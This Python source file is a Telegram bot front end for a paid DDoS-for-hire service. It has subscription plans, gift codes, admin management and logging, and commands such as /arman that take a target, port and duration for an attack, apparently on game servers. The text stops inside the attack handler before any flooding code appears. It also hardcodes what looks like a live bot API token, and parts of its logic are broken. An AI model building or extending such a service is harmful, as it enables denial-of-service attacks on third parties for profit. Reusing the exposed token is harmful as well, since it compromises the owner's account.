# THIS FILE IS MADE BYE - @MR_ARMAN_OWNER

import telebot
import time
import asyncio
import random
# THIS FILE IS MADE BYE - @MR_ARMAN_OWNER
import datetime
import os
import sys
import threading
import string
import subprocess
from telebot import TeleBot
# THIS FILE IS MADE BYE - @MR_ARMAN_OWNER

# ADD YOU'RE BOT TOKEN HERE 👇
API_TOKEN = '7624727037:AAGmjZK_YTgZIUymi2XRmpPKoK3WUdvHUfE'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

owner_id = "7933339379"
admin_ids = ["7933339379"]
admin_id = ["7933339379"]

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

USER_FILE = 'users.txt'
LOG_FILE = 'log.txt'
user_approval_expiry = {}
USER_FILE = 'users.txt'
allowed_user_id = []

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

user_string = "User ID: 1 2024-12-17 08:37:05.716914"
user_id = int(user_string.split()[2])  # This will extract and convert '1' to an integer

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# List to store allowed user IDs
allowed_user_ids = read_users()
# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"
# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["7933339379"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER


@bot.message_handler(commands=['my_plan'])
def send_user_plan(message):
    # Example lists of allowed user IDs for each plan
    allowed_user_ids = read_users()  # Replace with actual IDs
    allowed_user_id = []  # Replace with actual IDs

    user_id = message.from_user.id

    # Check which plan the user is subscribed to
    if user_id in allowed_user_ids:
        user_plan = "PLAN 1"
    elif user_id in allowed_user_id:
        user_plan = "PLAN 2"
    else:
        user_plan = "Not subscribed to any plan"

    # Prepare the response
    response = f"YOUR PLAN = {user_plan}\n\nAvailable plans:\n- PLAN 1\n- PLAN 2"
    bot.reply_to(message, response)

@bot.message_handler(commands=['owner'])
def send_owner_message(message):
    owner_message = "👤 OWNER ID - @FATHER_OF_HAX 🎉"
    bot.reply_to(message, owner_message)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    is_approved = "✔️ Approved" if user.id in allowed_user_ids else "❌ N/A"
    
    # Send the initial checking... message
    checking_message = bot.send_message(message.chat.id, "🔍 Checking your info...")
    
    # Wait for 1 second
    time.sleep(1)
    
    # Create the user info message
    user_info = (
        f"✨ ᕼᕮY @{user.first_name}\nHƐRƐ'S ƳOUR ƊƐƬAILS ⚓\n"
        f"👤 тԍ usᴇʀ ιᴅ : {user.id}\n"
        f"👍 тԍ usᴇʀɴᴀмᴇ : @{user.username if user.username else 'ɴoт sᴇт'}\n"
        f"🌍 ғιʀsт ɴᴀмᴇ : {user.first_name}\n"
        f"🆔 ʟᴀsт ɴᴀмᴇ : {user.last_name if user.last_name else 'ɴoт sᴇт'}\n"
        f"📅 נoιɴᴇᴅ ᴅᴀтᴇ : {message.date}\n"
        f"💌 cнᴀт ιᴅ : {message.chat.id}\n"
        f"✔️ ᴀᴘᴘʀovᴀʟ sтᴀтus : {is_approved}\n\n"
        f"κᴇᴇᴘ sнιɴιɴԍ ᴀɴᴅ нᴀvᴇ ᴀ woɴᴅᴇʀғuʟ ᴅᴀʏ! 🌈✨\n"
        f"ŦĦƗS ɃØŦ ØWNɆɌ :- @FATHER_OF_HAX"
    )
    
    bot.edit_message_text(user_info, chat_id=message.chat.id, message_id=checking_message.message_id, parse_mode='Markdown')

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['plan_1'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = (
                        f"💐 HELLO {user_to_add}!\n"
                        f"🎉 CONGRATULATIONS! YOU'RE APPROVED ✅ \n"
                        "🌟 WELCOME TO THE ARMAN TEAM!\n\n"
                        "🚀 GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\n"
                        "📜 **PLAN 1**: Basic Access - Enjoy standard features for your engagement. \n"
                        "📜 **PLAN 2**: Premium Access - Unlock all features and additional benefits. \n"
                        f"👤 APPROVED BY @MR_ARMAN_OWNER\n\n"
                        f"APPROVED FOR {duration} {time_unit}\n"
                        f"⚡ ACCESS WILL BE ACTIVE UNTIL {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍.\n\n"
                        "💫 LET THE FUN BEGIN! 🎊"
                    )
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet, please purchase from: @FATHER_OF_HAX."

    bot.reply_to(message, response)

def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @FATHER_OF_HAX 🙇."

    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['time'])
def send_current_time(message):
    now = datetime.datetime.now()
    current_time = f"CURRENT TIME IS\n\n{now.year}/{now.month}/{now.day}/{now.minute}/{now.second % 60}"
    bot.send_message(message.chat.id, current_time)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['plan_2'])
def approve_user_2(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_id.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"User {user_to_approve} approved for {duration} 👍\nPLAN :- 2."
        else:
            response = "Usage: /plan_2 <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['remove_2'])
def remove_user_2(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_id:
                allowed_user_id.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_id:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /remove_2 <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['add_admin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['remove_admin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['create_gift_code'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"Key price for {duration} set to {price} credits 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @FATHER_OF_HAX ❄."
    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['clear_users'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER 🙇."
    bot.reply_to(message, response)
 # This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER


running_attacks = []
def running_attacks_func():
    pass

def send_development_alert(chat_id):
    time.sleep(300)  # Wait for 10 minutes (600 seconds)
    bot.send_message(chat_id, "⚠️ THIS BOT IS UNDER DEVELOPMENT ⚠️\n\nIF YOU HAVE FACING ANY ESSUE KINDLY DM :- @FATHER_OF_HAX ✅")
    
@bot.message_handler(commands=['ADMIN_COMMANDS'])
def send_admin_commands(message):
    admin_commands_list = (
        "HERE'S THE ADMIN COMMANDS:\n\n"
        "/create_gift_code - CREATE A GIFT CODE\n"
        "/add_admin - ADD AN ADMIN\n"
        "/remove_admin - REMOVE AN ADMIN\n"
        "/users - LIST ALL USERS\n"
        "/plan_1 - MANAGE PLAN 1\n"
        "/remove_1 - REMOVE PLAN 1 USERS\n"
        "/plan_2 - MANAGE PLAN 2\n"
        "/remove_2 - REMOVE PLAN 2 USERS\n"
        "/broadcast - SEND A MESSAGE TO ALL USERS\n"
        "/mute - MUTE A USER\n"
        "/logs - VIEW THE LOGS\n\n"
        "Done ✅"
    )
    bot.reply_to(message, admin_commands_list)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER


@bot.message_handler(commands=['COMMANDS'])
def available_commands(message):
    commands_message = (
        "𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 👇\n\n"
        "👩‍✈️ 𝙁𝙊𝙍 𝘼𝘿𝙈𝙄𝙉𝙎 💠\n\n"
        "👩‍✈️ /plan_1 = 𝙏𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝙀 𝙐𝙎𝙀𝙍 𝙒𝙄𝙏𝙃 𝙋𝘼𝙄𝘿 𝙋𝙇𝘼𝙉 💠\n"
        "👩‍✈️ /plan_2 = 𝙏𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝙀 𝙐𝙎𝙀𝙍 𝙒𝙄𝙏𝙃 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙋𝙇𝘼𝙉 💠\n"
        "👩‍✈️ /create_gift_code = 𝙏𝙊 𝘾𝙍𝙀𝘼𝙏𝙀 𝙂𝙄𝙁𝙏 𝘾𝙊𝘿𝙀 𝙁𝙊𝙍 𝙐𝙎𝙀𝙍𝙎 💠\n"
        "👩‍✈️ /add_admin = 𝙏𝙊 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉 𝙊𝙉 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏 💠\n"
        "👩‍✈️ /remove_admin = 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉 𝙊𝙉 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏 💠\n"
        "👩‍✈️ /set_key_price = 𝙏𝙊 𝙎𝙀𝙏𝙏 𝙆𝙍𝙔 𝙋𝙍𝙄𝘾𝙀 💠\n"
        "👩‍✈️ /users = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝘼𝙇𝙇 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀𝘿 𝙐𝙎𝙀𝙍𝙎 💠\n"
        "👩‍✈️ /logs = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙇𝙊𝙂𝙎 💠\n"
        "👩‍✈️ /set_limit = 𝙏𝙊 𝙎𝙀𝙏𝙏 𝙇𝙄𝙈𝙄𝙏 𝙄𝙉 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 💠\n"
        "👩‍✈️ /clear_users = 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙇 𝙐𝙎𝙀𝙍𝙎 💠\n"
        "👩‍✈️ /clear_logs = 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙇 𝙇𝙊𝙊𝙂𝙎 💠\n\n"
        "👤 𝗙𝗢𝗥 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 👤\n\n"
        "👤 /arman = 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 𝙒𝙄𝙏𝙃 𝙋𝙇𝘼𝙉 1 💠\n"
        "👤 /fuck = 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 𝙒𝙄𝙏𝙃 𝙋𝙇𝘼𝙉 2 💠\n"
        "👤 /redeem = 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝘼 𝘾𝙊𝘿𝙀 💠\n"
        "👤 /checkbalance = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝘽𝘼𝙇𝘼𝙉𝘾𝙀 💠\n"
        "👤 /myinfo = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙄𝙉𝙁𝙊 💠\n"
        "👤 /owner = 𝙏𝙊 𝙂𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙄𝘿 💠\n"
        "👤 /mylogs = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙇𝙊𝙂𝙎 💠"
    )
    bot.send_message(message.chat.id, commands_message)

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['users'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username if user_info.username else "No Username"

                            # Get user attack count from log
                            attack_count = get_user_attack_count(user_id)  # Implement this function

                            # Get access expiration time
                            access_expiration = get_user_access_expiration(user_id)  # Implement this function
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

                            response += (
                                f"👤 USER NAME: @{username}\n"
                                f"🆔 USER ID: {user_id}\n"
                                f"⚔️ USER ATTACKS: {attack_count}\n"
                                f"✅ APPROVED BY: @MR_ARMAN_OWNER\n"  # Change this as per your logic for approved by
                                f"⏳ ACCESS EXPIRE TIME: {access_expiration}\n"
                                "=====================\n"
                            )
                        except Exception as e:
                            response += f"- User ID: {user_id} (Error: {str(e)})\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER❄."

    bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Implement the following functions to retrieve necessary data

def get_user_attack_count(user_id):
    # Logic to read from log.txt and get attack count for the user
    return 0  # Placeholder

def get_user_access_expiration(user_id):
    # Logic to determine access expiration time for the user
    return "Never"  # Placeholder
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @FATHER_OF_HAX\n205 KALA JADU "
        bot.reply_to(message, response)
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =5
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

@bot.message_handler(commands=['sett_limit'])
def sett_limit(message):
    user_info = message.from_user
    user_id = str(user_info.id)

    # Check if the user has permission to set limits
    if user_id not in admin_id:
        bot.reply_to(message, "🚫 UNAUTHORIZED ACCESS! 🚫\n\nYou do not have permission to use this command.")
        return

    command_parts = message.text.split()
    
    if len(command_parts) == 3:  # Expecting: /sett_limit <user_id> <limit_seconds>
        target_user_id = command_parts[1]
        limit_seconds = int(command_parts[2])

        if limit_seconds < 1:
            bot.reply_to(message, "⚠️ Error: The limit must be greater than 0 seconds.")
            return
        
        # Store the limit for the target user
        user_limits[target_user_id] = limit_seconds  # Assuming user_limits is a dictionary to hold user limits
        
        bot.reply_to(message, f"✅ User ID {target_user_id} can now perform attacks for a maximum of {limit_seconds} seconds.")
    else:
        bot.reply_to(message, "❗ Usage: /sett_limit <user_id> <limit_seconds>\nExample: /sett_limit 12345678 10")

user_limits = {}  # Dictionary to store user limits for attack duration

# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER
# This File Is Made By @MR_ARMAN_OWNER

# Handler for /arman command
@bot.message_handler(commands=['arman'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Expecting: /arman <target> <port> <time>
            target = command[1]
            try:
                port = int(command[2])  # Convert port to integer
                time = int(command[3])  # Convert time to integer
            except ValueError:
                bot.reply_to(message, "⚠️ Error: Port and time must be valid integers.")
                return

            if time > 120:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 120.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩."
                bot.reply_to(message, response)
                return
            
            # Check if the specified time is within the user's limit
